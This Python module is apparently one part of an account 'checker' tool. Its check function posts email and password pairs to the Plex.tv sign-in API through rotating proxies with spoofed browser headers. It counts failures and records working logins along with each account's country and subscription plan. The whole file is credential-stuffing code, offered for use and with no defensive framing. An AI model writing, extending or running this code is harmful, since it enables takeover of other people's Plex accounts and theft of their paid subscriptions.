from modules.variables import Checker
from modules.functions import bad_proxy, log, return_proxy,save,set_proxy, get_guid
from requests import Session
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)
            
            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                guid = get_guid()
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded" ,
                    "accept": "application/json" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "origin": "https://app.plex.tv" ,
                    "referer": "https://app.plex.tv/", 
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.113 Safari/537.36" 
                }
                data = {'login':email,'password':password,'rememberMe':True}
                response = s.post(f"https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex%20Web&X-Plex-Version=4.71.0&X-Plex-Client-Identifier={guid}",data=data,headers=headers)
                if "{\"errors\":" in response.text or "\"status\":401}]}" in response.text or "\"User could not be authenticated\"," in response.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "{\"id\":" in response.text or ",\"uuid\":\"" in response.text or ",\"thumb\":\"" in response.text or "\":{\"active\":" in response.text:
                    data = response.json()
                    country = data["country"]
                    active = data["subscription"]["active"]
                    subscription = data["subscriptionDescription"]
                    if not active:
                        Checker.custom += 1
                        return_proxy(proxy)
                        if not Checker.cui: log("custom",":".join([email,password]),"Plextv")
                        save("Plextv","custom",Checker.time,":".join([email,password]))
                        return
                    
                    Checker.good += 1
                    return_proxy(proxy)
                    if not Checker.cui: log("good",":".join([email,password]),"Plextv")
                    save("Plextv","good",Checker.time,":".join([email,password])+f" | Country: {country} | Plan: {subscription}")
                    return
                else:
                    raise
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        